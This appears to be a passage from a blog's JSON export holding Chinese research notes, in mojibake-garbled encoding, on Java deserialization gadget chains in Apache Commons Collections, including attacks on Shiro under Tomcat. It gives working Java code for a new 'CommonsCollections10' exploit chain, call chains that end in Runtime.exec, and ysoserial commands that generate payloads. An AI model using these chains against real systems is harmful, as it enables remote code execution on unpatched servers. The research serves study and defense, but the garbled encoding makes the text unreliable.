ä»CommonsCollection5å¼€å§‹ï¼Œå‡ºç°äº†TiedMapEntryï¼Œå…¶ä½œä¸ºä¸­ç»§ï¼Œè°ƒç”¨äº†LazyMapï¼ˆmapï¼‰çš„getå‡½æ•°ã€‚ æ¥çœ‹ä¸€çœ‹ å…¶ä¸­mapå’Œkeyæˆ‘ä»¬éƒ½å¯ä»¥æ§åˆ¶ï¼Œè€ŒLazyMap.getè°ƒç”¨äº†transformå‡½æ•°ï¼Œå¹¶å°†å¯æ§çš„keyä¼ å…¥transformå‡½æ•° è¿™é‡Œå°±æ¥ä¸Šäº†æˆ‘ä»¬å‰é¢è®¨è®ºçš„ï¼Œå°†æ„é€ å¥½çš„TemplatesImplï¼ˆkeyï¼‰ä½œä¸ºInvokerTransformer.transformå‡½æ•°çš„inputä¼ å…¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†templates gadgetsä¸²èµ·æ¥äº†ã€‚ ç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬å°†CommonsCollections5,6,9æ„é€ é“¾ä¸­çš„TiedMapEntryçš„keyç”¨äº†èµ·æ¥ã€‚ 123final Object templates = Gadgets.createTemplatesImpl(command);// TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); //åŸæ¥çš„åˆ©ç”¨æ–¹å¼TiedMapEntry entry = new TiedMapEntry(lazyMap, templates); è¿™é‡Œå°†æ— æ„ä¹‰çš„fooæ”¹é€ æˆäº†è§¦å‘TemplatesImpl.newTransformerçš„triggerã€‚ è€Œåœ¨TiedMapEntryå‰çš„åˆ©ç”¨é“¾ï¼Œåœ¨åŸç”Ÿshiroç¯å¢ƒä¸‹ï¼Œå¹¶ä¸å†²çªï¼ˆæ²¡æœ‰æ•°ç»„ç±»å‹çš„å¯¹è±¡ï¼‰ï¼Œå¯ä»¥æ­£å¸¸ååºåˆ—åŒ–ã€‚è¿™ä¸€éƒ¨åˆ†å°±çœç•¥äº†ã€‚ 20200108è¡¥å……å…¶å®createTemplatesImplçš„åˆ©ç”¨æ–¹å¼ä¸­è¿˜æ˜¯å­˜åœ¨æ•°ç»„å½¢å¼çš„ï¼Œbyte[]æ•°ç»„ç”¨äºå­˜å‚¨evil classã€‚ä½†æ˜¯åœ¨tomcat 7åŠä»¥ä¸Šçš„ç¯å¢ƒä¸‹ï¼Œjavaçš„åŸç”Ÿæ•°æ®ç±»å‹çš„æ•°ç»„è¿˜åŸä¸å½±å“ååºåˆ—åŒ–ï¼Œåªé’ˆå¯¹å¯¹è±¡çº§åˆ«çš„æ•°ç»„è¿˜åŸã€‚è€Œtomcat6çš„å®ç°æ–¹å¼ç›´æ¥ä¸å…è®¸æ•°ç»„ç±»å‹çš„è¿˜åŸï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥åˆ©ç”¨é“¾åœ¨tomcat6çš„ç¯å¢ƒä¸‹æ˜¯æˆåŠŸä¸äº†çš„ã€‚ 20200109è¡¥å……å½“åº”ç”¨å¼€å¯äº†security manageræ—¶ï¼Œéœ€è¦è®¾ç½®-Djdk.xml.enableTemplatesImplDeserialization=true 0x04 EXPç¼–å†™è¿™é‡Œå…¶å®å¯ä»¥æ„é€ å‡ºå¥½å‡ ä¸ªé“¾ï¼Œæˆ‘è¿™é‡Œå°±æ‹¿HashSetä¸ºä¾‹ï¼Œå®Œæ•´çš„expè§MyYsoserialä¸­çš„CommonsCollections10 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849final Object templates = Gadgets.createTemplatesImpl(command);// æ„é€ å¸¦æœ‰evil class bytesçš„TemplatesImpl// æ„é€ InvokerTransformerï¼Œå¡«å……æ— å®³çš„toStringå‡½æ•°final InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]);final Map innerMap = new HashMap();// æ„é€ LazyMapçš„factoryä¸ºå‰é¢çš„InvokerTransformerfinal Map lazyMap = LazyMap.decorate(innerMap, transformer);// å¡«å……TiedMapEntryçš„mapï¼ˆlazyMapï¼‰å’Œkeyï¼ˆTemplatesImplï¼‰TiedMapEntry entry = new TiedMapEntry(lazyMap, templates);HashSet map = new HashSet(1);map.add(\"foo\");// ä¸‹è¿°ä»£ç å°†entryå¡«å……åˆ°HashSetçš„nodeçš„keyä¸Šï¼Œå¯ä»¥ä½¿å¾—HashSetåœ¨putçš„æ—¶å€™è°ƒç”¨TiedMapEntryçš„hashCodeå‡½æ•°Field f = null;try &#123; f = HashSet.class.getDeclaredField(\"map\");&#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(\"backingMap\");&#125;Reflections.setAccessible(f);HashMap innimpl = null;innimpl = (HashMap) f.get(map);Field f2 = null;try &#123; f2 = HashMap.class.getDeclaredField(\"table\");&#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(\"elementData\");&#125;Reflections.setAccessible(f2);Object[] array = new Object[0];array = (Object[]) f2.get(innimpl);Object node = array[0];if(node == null)&#123; node = array[1];&#125;Field keyField = null;try&#123; keyField = node.getClass().getDeclaredField(\"key\");&#125;catch(Exception e)&#123; keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");&#125;Reflections.setAccessible(keyField);keyField.set(node, entry);// å°†æœ€ç»ˆçš„è§¦å‘å‡½æ•°newTransformerè£…è½½åˆ°InvokerTransformerä¸ŠReflections.setFieldValue(transformer, \"iMethodName\", \"newTransformer\");return map; è¿™é‡Œä¸å¯¹æºç è¿›è¡Œè®²è§£äº†ï¼Œéƒ½å†™åœ¨äº†æ³¨é‡Šé‡Œã€‚ è¿™é‡Œæ•´ç†ä¸€ä¸‹è¿™æ¡é“¾çš„è°ƒç”¨è¿‡ç¨‹ 12345678910java.util.HashSet.readObject()-&gt; java.util.HashMap.put()-&gt; java.util.HashMap.hash() -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() -&gt; org.apache.commons.collections.map.LazyMap.get() -&gt; org.apache.commons.collections.functors.InvokerTransformer.transform() -&gt; java.lang.reflect.Method.invoke() ... templates gadgets ... -&gt; java.lang.Runtime.exec() 0x05 æ€»ç»“åœ¨ç»è¿‡å¯¹CommonsCollectionsç³»åˆ—çš„åˆ©ç”¨é“¾è¿›è¡Œåˆ†æåï¼Œåœ¨shiroè¿™ä¸ªé—®é¢˜ä¸Šï¼Œè¿›è¡Œäº†å®æˆ˜ï¼Œè§£å†³äº†tomcatä¸‹æ— æ³•åˆ©ç”¨shiroåŸç”Ÿçš„commons-collections:3.2.1è¿™ä¸ªé—®é¢˜ã€‚ æœ€åï¼Œåœ¨æœ€è¿‘çš„shiro-721åˆ©ç”¨ä¸Šï¼Œè¿™ä¸ªåˆ©ç”¨é“¾å¸Œæœ›å¯ä»¥å¸®åŠ©åˆ°å¤§å®¶ Happy Hacking XD"},{"title":"ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections2,4,8","permalink":"http://blog.0kami.cn/2019/11/05/study-java-deserialized-commonscollections4/","text":"0x00 å‰è¨€å‰é¢å‡ ç¯‡æ–‡ç« ï¼Œåˆ†æäº†CommonsCollections:3.2.1ç‰ˆæœ¬ä»¥ä¸‹å­˜åœ¨çš„ååºåˆ—åŒ–é“¾ã€‚ä»Šå¤©å°†ç»§ç»­åˆ†æCommonsCollections:4.0ç‰ˆæœ¬ï¼Œä¸»è¦è®²è¿°CommonsCollections2ï¼Œ4ï¼Œ8çš„åˆ©ç”¨é“¾æ„é€ ã€‚ 0x01 å‰æ™¯å›é¡¾commons-collections:4.0ç‰ˆæœ¬å…¶å®å¹¶æ²¡æœ‰åƒ3.2.2ç‰ˆæœ¬çš„ä¿®å¤æ–¹å¼ä¸€æ ·åšæ‹‰é»‘å¤„ç†ï¼Œæ‰€ä»¥åœ¨3.2.1åŠä»¥ä¸‹çš„åˆ©ç”¨é“¾æ”¹æ”¹è¿˜æ˜¯å¯ä»¥ç”¨çš„ã€‚ä¾‹å¦‚CommonsCollections5 12final Map&lt;String, String&gt; innerMap = new HashMap();final Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain); å°†innerMapæ”¹æˆé”®å€¼å¯¹çš„ç”³æ˜æ–¹å¼å³å¯ï¼Œä½†æ˜¯å¤§å®¶æ˜¯ä¸æ˜¯è¿˜è®°å¾—ï¼Œé™¤äº†ç”¨LazyMapçš„æ–¹å¼ï¼ŒCommonsCollections3æ›¾æåˆ°è¿‡ä½¿ç”¨TrAXFilterç±»åˆå§‹åŒ–çš„æ–¹å¼æ¥è½½å…¥ä»»æ„çš„class bytesæ•°ç»„ã€‚ commons-collections:4.0ç‰ˆæœ¬ä¸‹çš„åˆ©ç”¨é“¾ï¼Œç”¨çš„éƒ½æ˜¯TemplatesImplä½œä¸ºæœ€ç»ˆçš„å‘½ä»¤æ‰§è¡Œçš„ä»£ç è°ƒç”¨ï¼Œç”±äºå‰é¢åˆ†æè¿‡è¿™ä¸ªåˆ©ç”¨æ–¹å¼ï¼Œåæ–‡ä¸å†å¤è¿°ã€‚ 0x02 åˆ©ç”¨é“¾åˆ†æ1. CommonsCollections2,4CommonsCollections2,4éƒ½ç”¨åˆ°äº†ä¸€ä¸ªæ–°çš„ç±»PriorityQueueçš„Comparatoræ¥è§¦å‘transformå‡½æ•°ï¼Œä¸¤è€…çš„åŒºåˆ«åœ¨äºä¸­é—´çš„æ¡¥æ¥ç”¨çš„ä¸åŒçš„Transformerå¯¹è±¡ã€‚å…ˆæ¥çœ‹ä¸€ä¸‹PriorityQueue.readObject æ¡†æ¡†é‡Œçš„ä¸»è¦å·¥ä½œä¸ºååºåˆ—åŒ–æ¢å¤è¯¥å¯¹è±¡çš„æ•°æ®ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨heapify() ç»§ç»­è·Ÿè¿›siftDown å½“æˆ‘ä»¬åœ¨å®ä¾‹åŒ–å¯¹è±¡æ—¶æä¾›äº†comparatorï¼Œå°†ä¼šæ¥åˆ°æˆ‘ä»¬æœ€ç»ˆè§¦å‘compareçš„ä½ç½®ï¼Œçœ‹ä¸€ä¸‹siftDownUsingComparator è¿™é‡Œè°ƒç”¨äº†æˆ‘ä»¬ä¼ å…¥çš„comparatorï¼Œå¹¶è°ƒç”¨å…¶compareï¼Œåˆ©ç”¨é“¾ä¸­ä½¿ç”¨äº†TransformingComparator,æ¥çœ‹ä¸€ä¸‹å®ƒçš„compareå‡½æ•° è°ƒç”¨äº†å½“å‰çš„transformerçš„transformå‡½æ•°ï¼Œçœ‹åˆ°è¿™é‡Œï¼Œå…¶å®å·²ç»å¾ˆç†Ÿäº†ï¼Œå‰é¢åˆ†æçš„å¾ˆå¤šåˆ©ç”¨é“¾éƒ½è·Ÿtransformæœ‰å…³ï¼Œå¹¶ä¸”4.0ç‰ˆæœ¬å¹¶æ²¡æœ‰æ‹‰é»‘ç›¸å…³çš„transformerã€‚æ‰€ä»¥æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨å‰é¢çš„ä¸€äº›æ€è·¯äº†ã€‚ CommonsCollections2 CommonsCollections2åˆ©ç”¨äº†InvokerTransformerç±»çš„ä»»æ„ç±»å‡½æ•°è°ƒç”¨çš„transformï¼Œä¼ å…¥æ„é€ å¥½çš„templates gadgetå¹¶è°ƒç”¨ TemplatesImpl.newTransformer CommonsCollections4 CommonsCollections4åç»­ç”¨çš„æ–¹æ³•åŒCommonsCollections3ä¸€æ ·ï¼Œç”¨InstantiateTransformeræ¥è§¦å‘TrAXFilterçš„åˆå§‹åŒ–ï¼Œæœ€ç»ˆä¹Ÿå°†è°ƒç”¨TemplatesImpl.newTransformer æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 12345678910111213141516171819202122CommonsCollection2:PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec()CommonsCollection4:PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; ChainedTransformer.transform() -&gt; InstantiateTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() 2.CommonsCollections8CommonsCollections8æ˜¯ä»Šå¹´navalorenzoæ¨é€åˆ°ysoserialä¸Šçš„ï¼Œ8ä¸2ï¼Œ4çš„åŒºåˆ«åœ¨äºä½¿ç”¨äº†æ–°çš„readObjectè§¦å‘ç‚¹TreeBag æ¥çœ‹ä¸€ä¸‹TreeBag.readObject è¿™é‡Œçš„ä¸¤ä¸ªå…³é”®ç‚¹TreeBagçš„çˆ¶ç±»çš„doReadObjectå‡½æ•°å’ŒTreeMap. çœ‹ä¸€ä¸‹doReadObject è¿™é‡Œå¯¹ä¼ å…¥çš„TreeMapè°ƒç”¨äº†putå‡½æ•° ç»§ç»­è·Ÿè¿›compareå‡½æ•° è¿™é‡Œåˆå›åˆ°äº†ç†Ÿæ‚‰çš„comparator.compareå‡½æ•°ï¼Œå…¶ä¸­comparatorå°±æ˜¯æˆ‘ä»¬æ„é€ çš„TransformingComparator åç»­è·ŸCommonsCollections2ç›¸åŒï¼Œå°±ä¸å¤è¿°äº†ã€‚ æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 12345678TreeBag.readObject() -&gt; AbstractMapBag.doReadObject() -&gt; TreeMap.put() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() 3. commons-collections:4.1åŠä»¥ä¸Šçš„æ”¹å˜å‰é¢æåˆ°çš„CommonsCollections2,4,8ï¼Œéƒ½æ˜¯åœ¨commons-collections:4.0ç‰ˆæœ¬ä¸‹æ‰å¯ä»¥ä½¿ç”¨çš„ã€‚è¿™é‡Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸ºä»€ä¹ˆåœ¨4.1åŠä»¥ä¸Šç‰ˆæœ¬æ— æ³•åˆ©ç”¨ï¼ å‰é¢æˆ‘ä»¬ç”¨åˆ°äº†InvokerTransformerå’ŒInstantiateTransformerä½œä¸ºä¸­è½¬ï¼Œå¾ˆçœŸå®ï¼Œ4.1ç‰ˆæœ¬è¿™ä¸¤ä¸ªç±»éƒ½æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œå¯¼è‡´æˆ‘ä»¬åœ¨åºåˆ—åŒ–æ—¶å°±æ— æ³•åˆ©ç”¨è¿™ä¸¤ä¸ªç±»ã€‚emmmmmï¼Œç›´æ¥å¹²æ‰äº†ä¸Šé¢çš„2ï¼Œ4ï¼Œ8ã€‚ è¿™ä¸ªæ”¹å˜æ„å‘³ç€æˆ‘ä»¬éœ€è¦ä»å…¶ä»–å¯æ“ä½œå±é™©æ–¹æ³•çš„å¯¹è±¡äº†ã€‚ 0x03 æ€»ç»“åˆ†æå®Œysoserialé‡Œçš„commons-collectionsç³»åˆ—çš„payloadsï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•æ€»ç»“ä¸€ä¸‹Javaçš„ååºåˆ—åŒ–æŒ–æ˜æ€è·¯ï¼ˆä¸æ¶‰åŠæŠ€æœ¯ç‚¹ï¼Œä¸ªäººçš„ä¸€äº›æƒ³æ³•ï¼‰ã€‚ 1. æœ€ç»ˆçš„åˆ©ç”¨æ•ˆæœåœ¨åˆ©ç”¨é“¾æ„é€ ä¸­ï¼Œæˆ‘ä»¬è‚¯å®šå¸Œæœ›æœ€ç»ˆå¯ä»¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œæˆ–è€…æ˜¯ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœï¼Œè¿™æ ·ä¼šä½¿å¾—ååºåˆ—åŒ–æ¼æ´çš„å¨åŠ›æœ€å¤§åŒ–ã€‚æ‰€ä»¥æˆ‘ä»¬å¾ˆå¼€å¿ƒèƒ½çœ‹åˆ°InvokerTransformerçš„transformå‡½æ•°ï¼Œä»–åˆ©ç”¨åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„çš„ä»£ç ï¼Œä¹Ÿæ„å‘³ç€æˆ‘ä»¬èƒ½æ§åˆ¶ä»»æ„ç±»çš„è°ƒç”¨æ‰§è¡Œã€‚ä½†æ˜¯åœ¨å®é™…çš„æŒ–æ˜ä¸­ï¼Œé™¤äº†å¯¹åå°„æœºåˆ¶çš„æŒ–æ˜å’ŒdefineClassç±»å‹çš„æŒ–æ˜ï¼Œæˆ‘ä»¬ä¹Ÿåº”è¯¥æ³¨æ„åˆ°å…¶ä»–å¯èƒ½ä¼šå­˜åœ¨çš„å±é™©åˆ©ç”¨ï¼Œå¦‚ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œä»»æ„æ–‡ä»¶åˆ é™¤ç­‰ç­‰ã€‚ 2. åˆ©ç”¨é“¾æ€»ä½“çš„ä¸€ä¸ªæŒ–æ˜æ€è·¯æˆ‘ä»¬åœ¨åˆ†æå®Œæ‰€æœ‰çš„CommonsCollectionsçš„payloadså¾ˆå®¹æ˜“å‘ç°çš„ä¸€ç‚¹æ˜¯å¾ˆå¤špayloadsâ€œæ‚äº¤â€ç»„åˆäº†å¤šä¸ªå¯åˆ©ç”¨çš„èŠ‚ç‚¹ã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨å®é™…çš„æŒ–æ˜ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆèƒ½è·çŸ¥å“ªäº›åº“æ–‡ä»¶é‡Œæœ‰å“ªäº›å¯åˆ©ç”¨çš„èŠ‚ç‚¹ï¼Œç„¶åæ ¹æ®ä¸€å®šçš„è§„åˆ™æ¥è¿›è¡Œä¸€ä¸ªé“¾æ¡çš„è¿æ¥ã€‚ é‚£ä¹ˆæ¥çœ‹ä¸€ä¸‹ï¼Œå¯åˆ©ç”¨çš„èŠ‚ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ å®ç°äº†Serializableæ¥å£ï¼Œæšä¸¾å‡ºæ‰€æœ‰å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ã€‚ è¯¥ç±»çš„ç±»å±æ€§åšäº†å‡½æ•°è°ƒç”¨æˆ–å‡½æ•°çš„è¿”å›å€¼ï¼Œå¦‚TreeMap.map.put()å’ŒConstantTransformer.transformç›´æ¥è¿”å›iConstantç±»å±æ€§ã€‚å¦‚æœä¸å­˜åœ¨ä¸Šè¿°çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥å¿½ç•¥ã€‚ å®ç°äº†readObjectå‡½æ•°ï¼Œè¿™ç§æƒ…å†µå¯ä½œä¸ºèµ·å§‹ç‚¹ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºæ¡¥æ¥ç‚¹ï¼Œéœ€è¦å…·ä½“åˆ¤æ–­å…¶ä»£ç çš„å®ç°ã€‚ å®ç°äº†invokeå‡½æ•°ï¼Œè¿™ç§æƒ…å†µå¯ä½œä¸ºæ¡¥æ¥ç‚¹ï¼Œåˆ©ç”¨äº†ä»£ç†æœºåˆ¶ã€‚ ä»readObjectå‡½æ•°å’Œinvokeå‡½æ•°ï¼Œè¡ç”Ÿå‡ºæ¥çš„ç±»å±æ€§å‡½æ•°è°ƒç”¨ï¼Œè¿™è¾¹å¯èƒ½ä¼šå¼•å‘å…¶ä»–çš„ç±»å‡½æ•°ï¼Œå¦‚TreeBag.readObjectçš„å®ç°ï¼Œå°†å¼•å‘ä¸‹ä¸€æ­¥çš„çˆ¶ç±»å‡½æ•°doReadObjectå‡½æ•°ã€‚è¿™é‡Œå°±éœ€è¦åšä¸€ä¸ªäººå·¥æˆ–è€…æ˜¯é™æ€çš„ä»£ç åˆ†æã€‚ æ¥ä¸‹æ¥ï¼Œå…³äºå¯åˆ©ç”¨èŠ‚ç‚¹çš„ä¸²è”ï¼Œå…¶å®ä¸»è¦ä¾èµ–äºç¬¬5ç‚¹çš„æŒ–æ˜ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®ç»éªŒæˆ–è€…æ˜¯é™æ€çš„ä»£ç åˆ†ææ¥åšã€‚ æ ¹æ®ä¸Šé¢çš„ä¸€ä¸ªåˆ†æï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥åšåˆ°ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„åˆ©ç”¨é“¾å‘æ˜ï¼Œhttps://github.com/JackOfMostTrades/gadgetinspector è¿™ä¸ªå·¥å…·å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å®ç°ï¼Œåç»­å°†å¯¹å…¶è¿›è¡Œä¸€ä¸ªåˆ†æã€‚ ä»commons-collectionsçš„é˜²æŠ¤æ¥çœ‹ï¼Œæˆ‘ä»¬è¶Šæ¥è¶Šæ— æ³•åœ¨å•ä¸ªåº“é‡Œé¢å®ç°ä¸€ä¸ªå¯åˆ©ç”¨çš„åˆ©ç”¨é“¾ï¼Œè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬éœ€è¦å¯¹ä¸åŒçš„é¡¹ç›®åšé’ˆå¯¹æ€§çš„åˆ†æï¼Œæ‰€ä»¥gadetinspectorè¿™ä¸ªå·¥å…·çš„é‡è¦æ€§å°±ä¸è¨€è€Œå–»äº†ã€‚ä¸‹ä¸€æ­¥å°†é‡ç‚¹åˆ†æä¸€ä¸‹è¯¥å·¥å…·çš„å®ç°ã€‚"},{"title":"ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections5,6,7,9,10","permalink":"http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/","text":"0x00 å‰è¨€æœ¬æ–‡ç»§ç»­åˆ†æCommonsCollectionsçš„ç›¸å…³ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿™æ¬¡ä¸»è¦åˆ†æCommonsCollections5,6,7ï¼Œä»¥åŠæˆ‘æ‰¾çš„ä¸€ä¸ªæ–°åˆ©ç”¨é“¾ï¼Œè¿™é‡Œæš‚ä¸”å°†å…¶ç§°ä¸º10. 0x01 ç¯å¢ƒå‡†å¤‡ jdk8ï¼Œcommons-collections:3.1 123java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 \"open /System/Applications/Calculator.app\" &gt; commonscollections5.serjava -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 \"open /System/Applications/Calculator.app\" &gt; commonscollections6.serjava -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 \"open /System/Applications/Calculator.app\" &gt; commonscollections7.ser 0x02 åˆ©ç”¨é“¾åˆ†æ 1. èƒŒæ™¯å›é¡¾å‰é¢æåˆ°è¿‡CommonsCollections1å’Œ3åœ¨æ„é€ AnnotationInvocationHandleræ—¶ç”¨åˆ°äº†Override.classã€‚ä½†æ˜¯å¦‚æœä½ åœ¨jdk8çš„ç¯å¢ƒä¸‹å»è½½å…¥ç”Ÿæˆçš„payloadï¼Œä¼šå‘ç”Ÿjava.lang.Override missing element entrySetçš„é”™è¯¯ã€‚ è¿™ä¸ªé”™è¯¯çš„äº§ç”ŸåŸå› ä¸»è¦åœ¨äºjdk8æ›´æ–°äº†AnnotationInvocationHandlerå‚è€ƒ jdk8ä¸ç›´æ¥è°ƒç”¨s.defaultReadObjectæ¥å¡«å……å½“å‰çš„AnnotaionInvocationHandlerå®ä¾‹ï¼Œè€Œé€‰æ‹©äº†å•ç‹¬å¡«å……æ–°çš„å˜é‡ã€‚ è¿™é‡Œæˆ‘ä»¬å›é¡¾ä¸€ä¸‹ï¼Œ1å’Œ3çš„payloadçš„è§¦å‘ç‚¹æ˜¯LazyMap.getå‡½æ•°ï¼Œè€Œè§¦å‘è¿™ä¸ªå‡½æ•°éœ€è¦ä½¿å¾—memberValuesä¸ºLazyMapå¯¹è±¡ æ˜¾ç„¶ï¼Œjdk8çš„æ“ä½œä½¿å¾—memberValueså¹¶ä¸æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„LazyMapç±»å‹ã€‚åœ¨è°ƒè¯•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„memberValuesä¸ºLinkedHashMapå¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ— æ³•è·å¾—entrySetçš„å†…å®¹ï¼Œæ‰€ä»¥ä¼šæŠ¥å‰é¢çš„è¿™ä¸ªé”™è¯¯ã€‚ jdk8ä¸‹CommonsCollections1å’Œ3æ— æ³•æˆåŠŸåˆ©ç”¨äº†ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ›¿ä»£AnnotationInvocationHandlerçš„åˆ©ç”¨æ–¹å¼å‘¢ï¼Ÿè¿™å°±æ˜¯æœ¬æ–‡è¦è®²çš„CommonsCollections5ï¼Œ6ï¼Œ7æ‰€åšå‡ºçš„æ”¹å˜ã€‚ 2. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections5CommonsCollections5ä¸1çš„åŒºåˆ«åœ¨äºAnnotationInvocationHandlerï¼Œåéƒ¨åˆ†æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸åˆ†æåéƒ¨åˆ†ã€‚ AnnotationInvocationHandleråœ¨å‰é¢èµ·åˆ°çš„ä½œç”¨æ˜¯æ¥è§¦å‘LazyMap.getå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯è¦é‡æ–°æ‰¾ä¸€ä¸ªå¯ä»¥è§¦å‘è¯¥å‡½æ•°çš„å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡æ»¡è¶³ ç±»å¯åºåˆ—åŒ–ï¼Œç±»å±æ€§æœ‰ä¸ªå¯æ§çš„Mapå¯¹è±¡æˆ–Object è¯¥ç±»çš„ç±»å‡½æ•°ä¸Šæœ‰è°ƒç”¨è¿™ä¸ªMap.getçš„åœ°æ–¹ CommonsCollections5åœ¨è¿™é‡Œç”¨åˆ°äº†TiedMapEntryï¼Œæ¥çœ‹ä¸€ä¸‹ TiedMapEntryæœ‰ä¸€ä¸ªmapç±»å±æ€§ï¼Œä¸”åœ¨getValueå¤„è°ƒç”¨äº†map.getå‡½æ•°ã€‚åŒæ—¶toStringã€hashCodeã€equalså‡è°ƒç”¨äº†getValueå‡½æ•°ï¼Œè¿™é‡Œå…³æ³¨toStringå‡½æ•°ã€‚ toStringå‡½æ•°é€šå¸¸åœ¨ä¸å­—ç¬¦ä¸²æ‹¼æ¥æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå¯¹è±¡æ»¡è¶³ ç±»å¯åºåˆ—åŒ–ï¼Œç±»å±æ€§æœ‰ä¸ªMap.Entryå¯¹è±¡æˆ–Object è¯¥ç±»ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªç±»å±æ€§çš„toStringå‡½æ•°æˆ–å‰é¢çš„å¦å¤–å‡ ç§ è¿™é‡Œé€‰æ‹©äº†BadAttributeValueExpExceptionå¯¹è±¡ï¼Œä»–çš„readObjectå‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨ç±»å±æ€§çš„toStringå‡½æ•°ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡ŒSystem.getSecurityManagerä¸ºç©ºï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯å½“å‰çš„jvmç¯å¢ƒä¸èƒ½å¯ç”¨å®‰å…¨ç®¡ç†å™¨ã€‚ æ¥çœ‹ä¸€ä¸‹ä¸€æ•´ä¸ªè°ƒç”¨é“¾ 12345BadAttributeValueExpException.readObject() -&gt; valObj.toString() =&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() 3. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections6CommonsCollections6æ˜¯å¦ä¸€ç§æ›¿æ¢æ–¹å¼ï¼ŒååŠéƒ¨åˆ†çš„åˆ©ç”¨é“¾è¿˜æ˜¯æ²¡æœ‰å˜ï¼Œä¸ä½œåˆ†æã€‚ æˆ‘ä»¬åœ¨2ä¸­æåˆ°äº†é™¤äº†CommonsCollections5ç”¨çš„toStringå¤–ï¼Œè¿˜æœ‰hashCodeå’Œequalså‡½æ•°ä¹Ÿè°ƒç”¨äº†getValueå‡½æ•°ã€‚é‚£ä¹ˆæ˜¯å¦å­˜åœ¨è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„å¯¹è±¡å‡½æ•°å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼ CommonsCollections6åˆ©ç”¨äº†TiedMapEntryçš„hashCodeå‡½æ•°ï¼Œæ¥è§¦å‘LazyMap.get 